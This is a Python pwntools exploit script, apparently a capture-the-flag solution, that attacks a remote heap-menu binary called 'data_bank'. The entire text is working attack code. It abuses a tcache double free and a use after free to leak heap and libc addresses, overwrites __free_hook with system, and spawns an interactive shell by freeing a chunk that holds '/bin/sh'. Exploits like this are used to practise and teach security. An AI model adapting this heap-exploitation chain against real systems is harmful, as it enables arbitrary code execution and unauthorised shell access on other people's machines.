from pwn import *
context.log_level = 'debug'
context.binary = './data_bank'
r = remote('35.200.202.92', 1337)
#r = remote('localhost', 4000)
libc = ELF('./libc.so.6')


r.sendlineafter('>> ', '1')
r.sendlineafter('index:\n', '0')
r.sendlineafter('size:\n', '64')
r.sendafter('data:\n', 'DDDDDDDD')


r.sendlineafter('>> ', '3')
r.sendlineafter('index:\n', '0')
r.sendlineafter('>> ', '3')
r.sendlineafter('index:\n', '0')

r.sendlineafter('>> ', '4')
r.sendlineafter('index:\n', '0')
r.recvuntil('data :')
heap = u64(r.recvn(6).ljust(8,'\x00'))
print hex(heap)

for _ in range(6):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('index:\n', '0')



def dup_chunk(idx, size):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('index:\n', str(idx))
    r.sendlineafter('size:\n', str(size))
    r.sendafter('data:\n', 'AAAAAAAA')

    for _ in range(8):
        r.sendlineafter('>> ', '3')
        r.sendlineafter('index:\n', str(idx))


dup_chunk(1, 120)
dup_chunk(2, 100)
r.sendlineafter('>> ', '1')
r.sendlineafter('index:\n', '3')
r.sendlineafter('size:\n', '1024')
r.sendafter('data:\n', 'AAAAAAAA')

r.sendlineafter('>> ', '4')
r.sendlineafter('index:\n', '0')
r.recvuntil('data :')
r.recvuntil('AAAAAAAA')
libc_base = u64(r.recvn(6).ljust(8,'\x00')) - 0x3ebca0
libc.address = libc_base
hook = libc.symbols['__free_hook']
system = libc.symbols['system']
print hex(libc_base)
print hex(hook)
print hex(system)

r.sendlineafter('>> ', '1')
r.sendlineafter('index:\n', '4')
r.sendlineafter('size:\n', '200')
r.sendafter('data:\n', 'AAAAAAAA')
r.sendlineafter('>> ', '3')
r.sendlineafter('index:\n', '4')
r.sendlineafter('>> ', '3')
r.sendlineafter('index:\n', '4')
r.sendlineafter('>> ', '2')
r.sendlineafter('index:\n', '4')
r.sendafter('data:\n', p64(hook))

r.sendlineafter('>> ', '1')
r.sendlineafter('index:\n', '5')
r.sendlineafter('size:\n', '200')
r.sendafter('data:\n', '/bin/sh\x00')

r.sendlineafter('>> ', '1')
r.sendlineafter('index:\n', '6')
r.sendlineafter('size:\n', '200')
r.sendafter('data:\n', p64(system))


r.sendlineafter('>> ', '3')
r.sendlineafter('index:\n', '5')

r.interactive()
